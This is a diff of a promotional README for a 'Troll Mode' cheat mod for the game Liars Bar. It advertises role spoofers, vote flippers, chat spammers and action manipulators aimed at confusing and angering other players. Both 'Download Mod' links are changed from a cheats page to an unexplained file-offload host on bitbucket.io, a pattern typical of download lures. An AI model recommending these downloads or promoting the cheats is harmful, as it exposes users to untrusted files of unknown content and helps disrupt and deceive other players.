@@ -6,7 +6,7 @@ In a game where lies are the meta, **Troll Mode** in **Liars Bar** takes things 
 
 This isn’t about stealth. It’s about **maximum chaos**. With **role spoofers, vote flippers, chat spammers, and action manipulators**, this mod setup turns Liars Bar into your personal comedy club. Ready to make the most serious players rage-quit from confusion? Let’s go.
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://wecheaters.github.io/cheats/liars-bar/)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 🎮 What Is Troll Mode?
@@ -21,7 +21,7 @@ Think:
 
 It’s chaos with intent.
 
-[![Download Mod](https://i.ytimg.com/vi/_leyi262T8M/hqdefault.jpg)](https://wecheaters.github.io/cheats/liars-bar/)
+[![Download Mod](https://i.ytimg.com/vi/_leyi262T8M/hqdefault.jpg)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 🔥 Top Troll Mode Features
